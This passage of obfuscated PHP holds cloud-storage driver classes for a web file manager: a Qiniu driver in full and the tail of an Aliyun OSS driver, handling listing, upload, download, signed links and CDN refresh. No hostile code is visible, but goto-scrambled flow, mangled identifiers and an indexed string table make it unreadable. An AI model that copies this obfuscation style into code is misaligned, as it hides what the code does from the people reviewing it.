$F‹öé»»à[OSS\OssClient::OSS_SUB_RESOURCE] .= $e–ãÃãÜ’[1201] . rawurlencode($F¢µ¢Š”ÓŞ); goto BçÒ¯šº¸Š; D™Úò‘Ì»ƒ: $e–ãÃãÜ’ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($this->isFileOutServer()) { return $this->fileOutServer($bå°–…äµ, $Fæ½šØÈ˜Œ, $AğËÍĞŸõğ, $AÅ´İ°ßŸè); } if (!$AğËÍĞŸõğ) { $AğËÍĞŸõğ = $this->pathThis($bå°–…äµ); } goto f÷‚§¤“áİ; f÷‚§¤“áİ: $AğËÍĞŸõğ = rawurlencode($AğËÍĞŸõğ); $F¢µ¢Š”ÓŞ = get_file_mime(get_path_ext($AğËÍĞŸõğ)); if ($F¢µ¢Š”ÓŞ == $e–ãÃãÜ’[213]) { return parent::fileOut($bå°–…äµ, $Fæ½šØÈ˜Œ, $AğËÍĞŸõğ, $AÅ´İ°ßŸè); } goto F¹µ´°Ù’Ë; BçÒ¯šº¸Š: $dóÜåˆë¬ä = $this->link($bå°–…äµ, $F‹öé»»à); $this->fileOutLink($dóÜåˆë¬ä); goto bÊ–Ï›Ñ; bÊ–Ï›Ñ: } public function fileOutServer($E¿ß£ŠÓ, $A¬©¡„ĞÔ¶ = false, $EÊêÙ‚”ã = false, $Bƒå•Ù¨¿ = '') { parent::fileOut($E¿ß£ŠÓ, $A¬©¡„ĞÔ¶, $EÊêÙ‚”ã, $Bƒå•Ù¨¿); } public function fileOutImage($f‚‚’¿†ØÔ, $d¹è™é³î± = 250) { $Cº‰äš ‡ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¹÷ˆ§éÒ°ú][1202] . $d¹è™é³î±); $AôŠè¼›Ñé = $this->link($f‚‚’¿†ØÔ, $Cº‰äš ‡); $this->fileOutLink($AôŠè¼›Ñé); } public function fileOutImageServer($a“¼¤Ã²¶¶, $cõ‰Äì»¦’ = 250) { parent::fileOutImage($a“¼¤Ã²¶¶, $cõ‰Äì»¦’); } public function fileOutLink($B²’„’‡›ò) { $aŠ£ÚŠ” =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->isCdnHost() && substr($B²’„’‡›ò, 0, 7) == $aŠ£ÚŠ”[1106]) { $B²’„’‡›ò = $aŠ£ÚŠ”[1107] . substr($B²’„’‡›ò, 7); } header($aŠ£ÚŠ”[168] . $B²’„’‡›ò); die; } public function hashMd5($D‰ºïš×, $aì¼Éé ù = '') { $fÙô‘œÊĞÖ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EİÚÇ§¤ä = $this->objectMeta($D‰ºïš×); if (!$EİÚÇ§¤ä) { return $fÙô‘œÊĞÖ[43]; } if (!isset($EİÚÇ§¤ä[$fÙô‘œÊĞÖ[1175]]) && !empty($aì¼Éé ù)) { $Fºçğ•á¯ = $this->updateObjMeta($D‰ºïš×, array($fÙô‘œÊĞÖ[1175] => $aì¼Éé ù)); $EİÚÇ§¤ä[$fÙô‘œÊĞÖ[1175]] = $Fºçğ•á¯ ? $aì¼Éé ù : $fÙô‘œÊĞÖ[43]; } return isset($EİÚÇ§¤ä[$fÙô‘œÊĞÖ[1175]]) ? strtolower($EİÚÇ§¤ä[$fÙô‘œÊĞÖ[1175]]) : $fÙô‘œÊĞÖ[43]; } public function size($a«ÛĞç®) { $dñô©ºø¼ = $this->objectMeta($a«ÛĞç®); return $dñô©ºø¼ ? $dñô©ºø¼[$_SERVER[¹÷ˆ§éÒ°ú][89]] : 0; } public function info($b‰Üî¢áŒ) { if ($this->isFolder($b‰Üî¢áŒ)) { return $this->folderInfo($b‰Üî¢áŒ); } else { if ($this->isFile($b‰Üî¢áŒ)) { return $this->fileInfo($b‰Üî¢áŒ); } } return !1; } public function exist($F©ïÑœ„´²) { return $this->isFile($F©ïÑœ„´²) || $this->isFolder($F©ïÑœ„´²); } public function isFile($C§¡Ëµ) { return !$this->isFolder($C§¡Ëµ) && $this->objectMeta($C§¡Ëµ); } public function isFolder($FÛÎŠä¾î) { return $this->cacheMethod($_SERVER[¹÷ˆ§éÒ°ú][234], $FÛÎŠä¾î); } protected function objectMeta($b‹³Êğ†±‚) { return $this->cacheMethod($_SERVER[¹÷ˆ§éÒ°ú][235], $b‹³Êğ†±‚); } protected function _objectMeta($aÜÖˆø˜çø) { $f‡ğÁ¬Œ½ =& $_SERVER[¹÷ˆ§éÒ°ú]; try { $bÚ®Ü†½µ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($aÜÖˆø˜çø)); } catch (OSS\Core\OssException $CùŒ“óê‰) { $bÚ®Ü†½µ = !1; } if ($bÚ®Ü†½µ) { $bÚ®Ü†½µ[$f‡ğÁ¬Œ½[89]] = intval($bÚ®Ü†½µ[$f‡ğÁ¬Œ½[1182]]); } return $bÚ®Ü†½µ; } protected function _isFolder($eˆ‰˜Í œ) { $cŸâ¾ÄÌÀè =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($eˆ‰˜Í œ == $cŸâ¾ÄÌÀè[43] || $eˆ‰˜Í œ == $cŸâ¾ÄÌÀè[18]) { return !0; } $Fİƒï£Ò½• = array($cŸâ¾ÄÌÀè[1172] => $cŸâ¾ÄÌÀè[18], $cŸâ¾ÄÌÀè[198] => rtrim($eˆ‰˜Í œ, $cŸâ¾ÄÌÀè[18]) . $cŸâ¾ÄÌÀè[18], $cŸâ¾ÄÌÀè[1173] => 1, $cŸâ¾ÄÌÀè[1174] => $cŸâ¾ÄÌÀè[43]); $F¿ªåÖå¨¯ = $this->client->listObjects($this->bucket, $Fİƒï£Ò½•); if ($F¿ªåÖå¨¯->getObjectList() || $F¿ªåÖå¨¯->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($d‰š®Óô±) { parent::__construct(); require_once SDK_DIR . $_SERVER[¹÷ˆ§éÒ°ú][1203]; $this->_init($d‰š®Óô±); } public function _init($cª·”£ğç±) { foreach ($cª·”£ğç± as $e’ìŸ˜ÛÚÕ => $B×ï—¡ö—) { if (isset($this->{$e’ìŸ˜ÛÚÕ})) { $this->{$e’ìŸ˜ÛÚÕ} = $B×ï—¡ö—; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¹÷ˆ§éÒ°ú][1204], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($D·–Ô‘ÍÕë, $dñ‰Ò’¬  = '', $a–Ó¿æˆ¼¥ = REPEAT_RENAME) { if ($this->setContent($D·–Ô‘ÍÕë, $dñ‰Ò’¬ )) { return $this->getPathOuter($D·–Ô‘ÍÕë); } return !1; } public function mkdir($D‘Õ‘„Ø‡, $D™—Ãñ—†² = REPEAT_SKIP) { goto e…øòÒã¶·; aÔÁƒ¨è“„: $D‘Õ‘„Ø‡ = $EÛ«ŞĞ„Ã’ . $cİ½ì³êëÓ[18]; $EÉ•­„ÙÕ = get_path_this($EÛ«ŞĞ„Ã’); $e·åƒÂÒî— = $D‘Õ‘„Ø‡ . $EÉ•­„ÙÕ; goto dÖÙ™²œÀ; e…øòÒã¶·: $cİ½ì³êëÓ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EÛ«ŞĞ„Ã’ = trim($D‘Õ‘„Ø‡, $cİ½ì³êëÓ[18]); if ($this->_isFolder($EÛ«ŞĞ„Ã’)) { return $this->getPathOuter($EÛ«ŞĞ„Ã’); } goto aÔÁƒ¨è“„; dÖÙ™²œÀ: if (!$this->mkfile($e·åƒÂÒî—)) { return !1; } if (!$this->moveFile($e·åƒÂÒî—, $D‘Õ‘„Ø‡)) { $this->delFile($e·åƒÂÒî—); return !1; } return $this->getPathOuter($EÛ«ŞĞ„Ã’); goto dÆÔõÉÖ; dÆÔõÉÖ: } public function copyFile($FµÈ©ÎÜ†ï, $c…ğñéİƒá) { $bÜò­çÀ„æ = $this->bucketManager->copy($this->bucket, $FµÈ©ÎÜ†ï, $this->bucket, $c…ğñéİƒá, !0); return $bÜò­çÀ„æ ? !1 : $this->getPathOuter($c…ğñéİƒá); } public function moveFile($fá÷öî§ÈØ, $aôªÁ¼«ÈÖ) { $AÊ’ˆíê²Ó = $this->bucketManager->move($this->bucket, $fá÷öî§ÈØ, $this->bucket, $aôªÁ¼«ÈÖ, !0); return $AÊ’ˆíê²Ó ? !1 : $this->getPathOuter($aôªÁ¼«ÈÖ); } public function delFile($e¥„ÊõÏÎ—) { $f¼²½ä’Ù§ = $this->bucketManager->delete($this->bucket, $e¥„ÊõÏÎ—); return $f¼²½ä’Ù§ ? !1 : !0; } public function delFolder($C‰Ğ¸¥ë”ó) { $FÓËœ’è´— = $this->fileList($C‰Ğ¸¥ë”ó); if (empty($FÓËœ’è´—)) { return !0; } $C‘÷šƒ²—À = 1000; if (count($FÓËœ’è´—) <= $C‘÷šƒ²—À) { return $this->qnDelObj($FÓËœ’è´—) ? !1 : !0; } foreach (array_chunk($FÓËœ’è´—, $C‘÷šƒ²—À) as $f¹Äİ¢®‹) { $DÁèà™½÷ = $this->qnDelObj($f¹Äİ¢®‹); if ($DÁèà™½÷) { return !1; } } return !0; } private function qnDelObj($Fƒ§æ÷ã˜) { $E„óÒº×­˜ = $this->bucketManager->buildBatchDelete($this->bucket, $Fƒ§æ÷ã˜); list($a¦Ìö’Å’ˆ, $bÀ•ôåôŞ¤) = $this->bucketManager->batch($E„óÒº×­˜); return $bÀ•ôåôŞ¤; } private function fileList($F­ÔøÄóî, $Fâ¾†ˆ´í = 0) { goto Dí¿ºÅËœÃ; Dí¿ºÅËœÃ: $b¹ø†Î§Ìˆ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F­ÔøÄóî = trim($F­ÔøÄóî, $b¹ø†Î§Ìˆ[18]); $cáÕ·¿Êç· = empty($F­ÔøÄóî) ? $b¹ø†Î§Ìˆ[43] : $F­ÔøÄóî . $b¹ø†Î§Ìˆ[18]; goto dÄíéÁª³; dÄíéÁª³: $a§ää‹à§ = $b¹ø†Î§Ìˆ[43]; $B£Éğ‚™Š = 1000; $eîŠÔÉŸ´Ÿ = $b¹ø†Î§Ìˆ[43]; goto E‡©Ò‰µİñ; E‡©Ò‰µİñ: $C›ª©×îôµ = array(); while (!0) { list($fìÍˆÓóÏ±, $cƒ¨éùêì…) = $this->bucketManager->listFiles($this->bucket, $cáÕ·¿Êç·, $a§ää‹à§, $B£Éğ‚™Š, $eîŠÔÉŸ´Ÿ); if ($cƒ¨éùêì…) { return !1; } $a§ää‹à§ = array_key_exists($b¹ø†Î§Ìˆ[1174], $fìÍˆÓóÏ±) ? $a§ää‹à§ = $fìÍˆÓóÏ±[$b¹ø†Î§Ìˆ[1205]] : $b¹ø†Î§Ìˆ[43]; foreach ($fìÍˆÓóÏ±[$b¹ø†Î§Ìˆ[1206]] as $A—Ãø±ˆõ¶) { $d‡ÒÑ§ = $A—Ãø±ˆõ¶[$b¹ø†Î§Ìˆ[101]]; if ($Fâ¾†ˆ´í) { $d‡ÒÑ§ = array($b¹ø†Î§Ìˆ[38] => $d‡ÒÑ§, $b¹ø†Î§Ìˆ[89] => $A—Ãø±ˆõ¶[$b¹ø†Î§Ìˆ[1207]]); } $C›ª©×îôµ[] = $d‡ÒÑ§; } if ($a§ää‹à§ == $b¹ø†Î§Ìˆ[43]) { break; } } return $C›ª©×îôµ; goto FÊë¥ï£Ãë; FÊë¥ï£Ãë: } public function rename($b‚‚›Øõ†ï, $b­ïÄøöÍ) { return $this->renameObject($b‚‚›Øõ†ï, $b­ïÄøöÍ); } public function fileInfo($dË“×‹“‰, $cÖ¡õíØ”  = false, $DñŸØ˜¬Ñï = array()) { goto C¹ñˆß¦“; E’ƒÀ„: return $e÷‰¶…³Èõ; goto aÎï¦…«²Š; C¹ñˆß¦“: $b°›‘å ÷ƒ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($cÖ¡õíØ” ) { return array($b°›‘å ÷ƒ[38] => $this->pathThis($dË“×‹“‰), $b°›‘å ÷ƒ[87] => $this->getPathOuter($b°›‘å ÷ƒ[18] . $dË“×‹“‰), $b°›‘å ÷ƒ[39] => $b°›‘å ÷ƒ[179], $b°›‘å ÷ƒ[89] => isset($DñŸØ˜¬Ñï[$b°›‘å ÷ƒ[1207]]) ? $DñŸØ˜¬Ñï[$b°›‘å ÷ƒ[1207]] : 0, $b°›‘å ÷ƒ[172] => $this->ext($dË“×‹“‰)); } $e÷‰¶…³Èõ = array($b°›‘å ÷ƒ[38] => $this->pathThis($dË“×‹“‰), $b°›‘å ÷ƒ[87] => $this->getPathOuter($b°›‘å ÷ƒ[18] . $dË“×‹“‰), $b°›‘å ÷ƒ[39] => $b°›‘å ÷ƒ[179], $b°›‘å ÷ƒ[199] => 0, $b°›‘å ÷ƒ[119] => 0, $b°›‘å ÷ƒ[89] => 0, $b°›‘å ÷ƒ[172] => $this->ext($dË“×‹“‰), $b°›‘å ÷ƒ[200] => !0, $b°›‘å ÷ƒ[201] => !0); goto c÷’Ï‡óßÕ; c÷’Ï‡óßÕ: if (empty($DñŸØ˜¬Ñï)) { $DñŸØ˜¬Ñï = $this->objectMeta($dË“×‹“‰); if (!$DñŸØ˜¬Ñï) { return $e÷‰¶…³Èõ; } } if (isset($DñŸØ˜¬Ñï[$b°›‘å ÷ƒ[1208]])) { $e÷‰¶…³Èõ[$b°›‘å ÷ƒ[119]] = substr($DñŸØ˜¬Ñï[$b°›‘å ÷ƒ[1208]] . $b°›‘å ÷ƒ[43], 0, 10); } if (isset($DñŸØ˜¬Ñï[$b°›‘å ÷ƒ[1207]])) { $e÷‰¶…³Èõ[$b°›‘å ÷ƒ[89]] = $DñŸØ˜¬Ñï[$b°›‘å ÷ƒ[1207]]; } goto E’ƒÀ„; aÎï¦…«²Š: } public function folderInfo($A·Ì¦Ë“÷Ä, $BÎ›ğ™áù = false) { goto bê©Æ¿ìÀª; A¡‡ˆ„Øğ: $A·Ì¦Ë“÷Ä = rtrim($A·Ì¦Ë“÷Ä, $CÀÕĞ¯¹¾Õ[18]) . $CÀÕĞ¯¹¾Õ[18]; $fâîÔµåØ÷ = $this->objectMeta($A·Ì¦Ë“÷Ä); if (isset($fâîÔµåØ÷[$CÀÕĞ¯¹¾Õ[1208]])) { $dÎÍË¯ìÚè[$CÀÕĞ¯¹¾Õ[119]] = substr($fâîÔµåØ÷[$CÀÕĞ¯¹¾Õ[1208]] . $CÀÕĞ¯¹¾Õ[43], 0, 10); } goto cŸàÓËÈµ; cŸàÓËÈµ: return $dÎÍË¯ìÚè; goto A’£Í‹Ïƒ; bê©Æ¿ìÀª: $CÀÕĞ¯¹¾Õ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($BÎ›ğ™áù) { return array($CÀÕĞ¯¹¾Õ[38] => $this->pathThis($A·Ì¦Ë“÷Ä), $CÀÕĞ¯¹¾Õ[87] => $this->getPathOuter($CÀÕĞ¯¹¾Õ[18] . $A·Ì¦Ë“÷Ä), $CÀÕĞ¯¹¾Õ[39] => $CÀÕĞ¯¹¾Õ[88]); } $dÎÍË¯ìÚè = array($CÀÕĞ¯¹¾Õ[38] => $this->pathThis($A·Ì¦Ë“÷Ä), $CÀÕĞ¯¹¾Õ[87] => $this->getPathOuter($CÀÕĞ¯¹¾Õ[18] . $A·Ì¦Ë“÷Ä), $CÀÕĞ¯¹¾Õ[39] => $CÀÕĞ¯¹¾Õ[88], $CÀÕĞ¯¹¾Õ[199] => 0, $CÀÕĞ¯¹¾Õ[119] => 0, $CÀÕĞ¯¹¾Õ[1153] => !0, $CÀÕĞ¯¹¾Õ[1154] => !0); goto A¡‡ˆ„Øğ; A’£Í‹Ïƒ: } public function listPath($Fàç‰‘†–ñ, $dèò°²†¿ = false) { goto b°İÎ‡İî­; a˜…‹å‘™²: $F¿‘°‘§…É = $e‚í®£Êé = array(); while (!0) { list($C‘Âê‰, $Bİ÷Üóåâ) = $this->bucketManager->listFiles($this->bucket, $bè¢•ÉˆÊÁ, $eè¥áÜó£, $FÔ•Š˜›ë, $Díè¥„Ô); if ($Bİ÷Üóåâ) { return !1; } $eè¥áÜó£ = array_key_exists($DùŸ¨øšæ›[1174], $C‘Âê‰) ? $eè¥áÜó£ = $C‘Âê‰[$DùŸ¨øšæ›[1205]] : $DùŸ¨øšæ›[43]; if (isset($C‘Âê‰[$DùŸ¨øšæ›[1209]])) { foreach ($C‘Âê‰[$DùŸ¨øšæ›[1209]] as $Aßï½ä³³) { if ($Aßï½ä³³ == $bè¢•ÉˆÊÁ) { continue; } $F¿‘°‘§…É[] = $this->folderInfo($Aßï½ä³³, $dèò°²†¿); } } if (isset($C‘Âê‰[$DùŸ¨øšæ›[1206]])) { foreach ($C‘Âê‰[$DùŸ¨øšæ›[1206]] as $a‹Òª´Üñ) { if ($a‹Òª´Üñ[$DùŸ¨øšæ›[101]] == $bè¢•ÉˆÊÁ) { continue; } $e‚í®£Êé[] = $this->fileInfo($a‹Òª´Üñ[$DùŸ¨øšæ›[101]], $dèò°²†¿, $a‹Òª´Üñ); } } if ($eè¥áÜó£ == $DùŸ¨øšæ›[43]) { break; } } return array($DùŸ¨øšæ›[86] => $F¿‘°‘§…É, $DùŸ¨øšæ›[85] => $e‚í®£Êé); goto FìÙ™Æ­Í ; b°İÎ‡İî­: $DùŸ¨øšæ› =& $_SERVER[¹÷ˆ§éÒ°ú]; $Fàç‰‘†–ñ = trim($Fàç‰‘†–ñ, $DùŸ¨øšæ›[18]); $bè¢•ÉˆÊÁ = empty($Fàç‰‘†–ñ) ? $DùŸ¨øšæ›[43] : $Fàç‰‘†–ñ . $DùŸ¨øšæ›[18]; goto e¢¬¿±¡­×; e¢¬¿±¡­×: $eè¥áÜó£ = $DùŸ¨øšæ›[43]; $FÔ•Š˜›ë = 1000; $Díè¥„Ô = $DùŸ¨øšæ›[18]; goto a˜…‹å‘™²; FìÙ™Æ­Í : } public function has($föò·¤„Š­, $D¦‚Õç¯¶À = false, $E•îœæ¡²¿ = true) { goto cåˆ©±Ñò; cåˆ©±Ñò: $BØ²•É‹õ =& $_SERVER[¹÷ˆ§éÒ°ú]; $föò·¤„Š­ = trim($föò·¤„Š­, $BØ²•É‹õ[18]); $Eò„«›Âí¦ = empty($föò·¤„Š­) ? $BØ²•É‹õ[43] : $föò·¤„Š­ . $BØ²•É‹õ[18]; goto cÒÜÕÊğìï; cÒÜÕÊğìï: $A™äŒØï²ñ = $BØ²•É‹õ[43]; $cçĞİÇšÓ† = 1000; $CõÚ§Ú»¬à = $BØ²•É‹õ[18]; goto eÓ¸”·—’§; e“­•¹ÄëŠ: if ($D¦‚Õç¯¶À) { return array($BØ²•É‹õ[203] => $bâ·ÁÔèì¤, $BØ²•É‹õ[204] => $B‹ºª©¯¿‰); } return !1; goto CÀê´±ÊñÖ; eÓ¸”·—’§: $bâ·ÁÔèì¤ = 0; $B‹ºª©¯¿‰ = 0; while (!0) { list($F÷ä¹Í•‰‚, $eÄßóòšÂš) = $this->bucketManager->listFiles($this->bucket, $Eò„«›Âí¦, $A™äŒØï²ñ, $cçĞİÇšÓ†, $CõÚ§Ú»¬à); if ($eÄßóòšÂš) { return !1; } $A™äŒØï²ñ = array_key_exists($BØ²•É‹õ[1174], $F÷ä¹Í•‰‚) ? $A™äŒØï²ñ = $F÷ä¹Í•‰‚[$BØ²•É‹õ[1205]] : $BØ²•É‹õ[43]; if ($D¦‚Õç¯¶À) { if (!empty($F÷ä¹Í•‰‚[$BØ²•É‹õ[1206]])) { $bâ·ÁÔèì¤ += count($F÷ä¹Í•‰‚[$BØ²•É‹õ[1206]]); } if (!empty($F÷ä¹Í•‰‚[$BØ²•É‹õ[1209]])) { $B‹ºª©¯¿‰ += count($F÷ä¹Í•‰‚[$BØ²•É‹õ[1209]]); } if ($A™äŒØï²ñ === $BØ²•É‹õ[43]) { break; } continue; } if ($E•îœæ¡²¿) { if (!empty($F÷ä¹Í•‰‚[$BØ²•É‹õ[1206]])) { return !0; } } else { if (!empty($F÷ä¹Í•‰‚[$BØ²•É‹õ[1209]])) { return !0; } } if ($A™äŒØï²ñ == $BØ²•É‹õ[43]) { break; } } goto e“­•¹ÄëŠ; CÀê´±ÊñÖ: } public function listAll($b¯ôÖÇ›å¥) { $bˆâÉ¡¸¬¢ =& $_SERVER[¹÷ˆ§éÒ°ú]; $CÛÔÕÕÌ¯ = $this->fileList($b¯ôÖÇ›å¥, 1); $cÓœçšäÚÓ = array(); foreach ($CÛÔÕÕÌ¯ as $A·ë“ì¾¢‚) { $cÓœçšäÚÓ[$A·ë“ì¾¢‚[$bˆâÉ¡¸¬¢[38]]] = $A·ë“ì¾¢‚[$bˆâÉ¡¸¬¢[89]]; } return $this->listAllFiles($b¯ôÖÇ›å¥, array_keys($cÓœçšäÚÓ), $cÓœçšäÚÓ); } public function canRead($bì¶æÚ‘¸”) { return $this->exist($bì¶æÚ‘¸”) ? !0 : !1; } public function canWrite($fïÈƒ‚à) { return $this->exist($fïÈƒ‚à) ? !0 : !1; } public function getContent($aÄ¾·ãÃÁœ) { return $this->fileSubstr($aÄ¾·ãÃÁœ, 0, -1); } public function setContent($B´§–”‰´®, $bãó…Å²í… = '') { $C…òŒÖß‡› = $this->tempFile($this->pathThis($B´§–”‰´®)); file_put_contents($C…òŒÖß‡›, $bãó…Å²í…); if ($this->upload($B´§–”‰´®, $C…òŒÖß‡›)) { $this->tempFileRemve($C…òŒÖß‡›); return !0; } return !1; } public function refreshUrls($c•ä‹éÜŠÒ) { goto C‘ë¢œ¢Ñå; C‘ë¢œ¢Ñå: $cíÇÊ…À÷ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c‚‘æŠ÷§Ï = array(); if (is_array($c•ä‹éÜŠÒ)) { foreach ($c•ä‹éÜŠÒ as $d–‘“Ë¯á») { $c‚‘æŠ÷§Ï[] = $this->link($d–‘“Ë¯á»); } } else { $c‚‘æŠ÷§Ï[] = $this->link($c•ä‹éÜŠÒ); } goto Eœ†åÌáÂ; Eœ†åÌáÂ: $F×ç¿æ½Ì² = new Qiniu\Cdn\CdnManager($this->auth); list($AßˆÄö·Öº, $DÉ‹¸Ç¦Å§) = $F×ç¿æ½Ì²->refreshUrls($c‚‘æŠ÷§Ï); if ($DÉ‹¸Ç¦Å§) { return !1; } goto Aœ°Ú›è¨; Aœ°Ú›è¨: return $AßˆÄö·Öº[$cíÇÊ…À÷[1210]] == $cíÇÊ…À÷[691] ? !0 : !1; goto E¹‡˜´¶’»; E¹‡˜´¶’»: } public function fileSubstr($a—šİ÷¥°¯, $A×§æÆ¬Ô, $AÃù£ËæµĞ) { $B ÏÎ‘Ñäö =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!($c‘å‘óæ™Ì = $this->link($a—šİ÷¥°¯))) { return !1; } $b”º ¶§Áİ = !1; if ($AÃù£ËæµĞ > 0) { $CïÓÂ ½šË = $A×§æÆ¬Ô + $AÃù£ËæµĞ - 1; $b”º ¶§Áİ = array($B ÏÎ‘Ñäö[1211] . $A×§æÆ¬Ô . $B ÏÎ‘Ñäö[423] . $CïÓÂ ½šË); } $dØ¦ëñÒïß = url_request($c‘å‘óæ™Ì, $B ÏÎ‘Ñäö[228], !1, $b”º ¶§Áİ); return $dØ¦ëñÒïß[$B ÏÎ‘Ñäö[684]] ? $dØ¦ëñÒïß[$B ÏÎ‘Ñäö[1025]] : !1; } public function upload($a“Õ‘Û÷ì¢, $A÷®°Ğóä, $d«ï«™Ú‡ = false, $A×±¸æëø = REPEAT_REPLACE) { $A¨‹–Ë¬æŸ = new Qiniu\Storage\UploadManager(); $eÅ¸ŸÎš– = $this->auth->uploadToken($this->bucket, $a“Õ‘Û÷ì¢); $BšõÙˆÅÓ‘ = get_file_mime(get_path_ext($A÷®°Ğóä)); list($cŠó¬™î¡´, $F£Å¼É‘©¾) = $A¨‹–Ë¬æŸ->putFile($eÅ¸ŸÎš–, $a“Õ‘Û÷ì¢, $A÷®°Ğóä, null, $BšõÙˆÅÓ‘); return $F£Å¼É‘©¾ ? !1 : $this->getPathOuter($a“Õ‘Û÷ì¢); } public function uploadFormData($bµñªàóÁ¼, $c”¬×÷ï­ = 3600) { return $this->uploadToken($bµñªàóÁ¼, $c”¬×÷ï­); } public function multiUploadFormData($Fñøñ²–Â÷, $AÌ®ƒËì¿ = 3600) { return $this->uploadToken($Fñøñ²–Â÷, $AÌ®ƒËì¿); } private function uploadToken($D‡—¯Çæ‡Ö, $báÆµê‰½« = 3600) { goto fğÖÃÇï®Ä; fğÖÃÇï®Ä: $Få§¼Ä”õ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F×éİÄ†ÈÜ = $báÆµê‰½«; $F–…™£Ğ‹Ò = array($Få§¼Ä”õ[1212] => $Få§¼Ä”õ[1213]); goto DÆŠ‚Ü¶®İ; DÆŠ‚Ü¶®İ: $EÕÎ¤êùÊ¶ = $D‡—¯Çæ‡Ö; $BòƒàÒ†ØŒ = $this->auth->uploadToken($this->bucket, $EÕÎ¤êùÊ¶, $F×éİÄ†ÈÜ, $F–…™£Ğ‹Ò, !0); $e‚‹Óì©¨· = empty($this->region) || $this->region == $Få§¼Ä”õ[1214] ? $Få§¼Ä”õ[43] : $Få§¼Ä”õ[423] . $this->region; goto fÇ„°¿ñƒ©; fÇ„°¿ñƒ©: $D«¹å®‚õ… = http_type() . "\x3a\57\57\165\x70\x6c\x6f\x61\x64{$e‚‹Óì©¨·}\56\x71\x69\x6e\151\x75\160\x2e\143\157\155\57"; return array($Få§¼Ä”õ[1215] => $BòƒàÒ†ØŒ, $Få§¼Ä”õ[1216] => $D«¹å®‚õ…); goto fğ äÙ¥¤å; fğ äÙ¥¤å: } public function download($aÇÒè´áÇ, $BƒÌ÷±‡Ğ) { goto b÷§Ï¡ôô…; b÷§Ï¡ôô…: $BôŸØÀğÚ‰ = IO::getPathInner(IO::mkfile($BƒÌ÷±‡Ğ)); if (!($f¡‰Ì¯¨¯  = $this->link($aÇÒè´áÇ))) { return !1; } $D†×¨ÁØ… = 0; goto d§è¸¨›İ; d§è¸¨›İ: $f¬ÀÃÄò = 1024 * 200; $F­ñ¸˜ˆªª = fopen($BôŸØÀğÚ‰, $_SERVER[¹÷ˆ§éÒ°ú][1217]); while (!0) { $C‘è¸¦õ = $this->fileSubstr($aÇÒè´áÇ, $D†×¨ÁØ…, $f¬ÀÃÄò); if ($C‘è¸¦õ === !1) { return !1; } fwrite($F­ñ¸˜ˆªª, $C‘è¸¦õ); $D†×¨ÁØ… += $f¬ÀÃÄò; if (strlen($C‘è¸¦õ) < $f¬ÀÃÄò) { break; } } goto d£¢‡Ìº; d£¢‡Ìº: fclose($F­ñ¸˜ˆªª); return $BƒÌ÷±‡Ğ; goto AÛ‰ËÏ§„; AÛ‰ËÏ§„: } public function link($e„¤´Ô¿é, $E°¥ôÜ†ÈÀ = '') { if (!$this->isFile($e„¤´Ô¿é)) { return !1; } $fç²Ëé–ˆÚ = $this->getHost() . $_SERVER[¹÷ˆ§éÒ°ú][18] . $this->pathEncode($e„¤´Ô¿é) . $E°¥ôÜ†ÈÀ; return $this->auth->privateDownloadUrl($fç²Ëé–ˆÚ, 3600 * 12); } public function fileOut($CÎÉµĞŠ¿ª, $C„ƒò•îÓè = false, $EàÍ¸õ¤‹­ = false, $aƒù¼öŒÁŠ = '') { $d¿¨ù–¡× =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($this->isFileOutServer()) { return $this->fileOutServer($CÎÉµĞŠ¿ª, $C„ƒò•îÓè, $EàÍ¸õ¤‹­, $aƒù¼öŒÁŠ); } if (!$EàÍ¸õ¤‹­) { $EàÍ¸õ¤‹­ = $this->pathThis($CÎÉµĞŠ¿ª); } $d±óøëïÄê = $C„ƒò•îÓè ? $d¿¨ù–¡×[1218] . rawurlencode($EàÍ¸õ¤‹­) : $d¿¨ù–¡×[43]; $f…ªóó›ˆ = $this->link($CÎÉµĞŠ¿ª, $d±óøëïÄê); $this->fileOutLink($f…ªóó›ˆ); } public function fileOutServer($f«ˆ —æ¡ , $f‹¼—´ãÅğ = false, $dîÅš­º = false, $FæÉ«Ú´¡¦ = '') { parent::fileOut($f«ˆ —æ¡ , $f‹¼—´ãÅğ, $dîÅš­º, $FæÉ«Ú´¡¦); } public function fileOutImage($DŒŠâãœÕï, $dî¢ã‰‚­ = 250) { $dÎáŒàí = $this->link($DŒŠâãœÕï, $_SERVER[¹÷ˆ§éÒ°ú][1219] . $dî¢ã‰‚­); $this->fileOutLink($dÎáŒàí); } public function fileOutImageServer($FÅáÀ„Ğä™, $fËæ§–‡¢ = 250) { parent::fileOutImage($FÅáÀ„Ğä™, $fËæ§–‡¢); } public function hashMd5($D©¿Â®îêÈ) { $b‹¿‡òù =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÁÁÑ„è‰‰ = $this->objectMeta($D©¿Â®îêÈ); return isset($dÁÁÑ„è‰‰[$b‹¿‡òù[208]]) ? $dÁÁÑ„è‰‰[$b‹¿‡òù[208]] : !1; $D“ã½Ú¦«† = $this->link($D©¿Â®îêÈ, $b‹¿‡òù[1220]); } public function size($cÚ¯ƒ«¸ÕÑ) { $B¾È½¿¼µ— = $this->objectMeta($cÚ¯ƒ«¸ÕÑ); return $B¾È½¿¼µ— ? 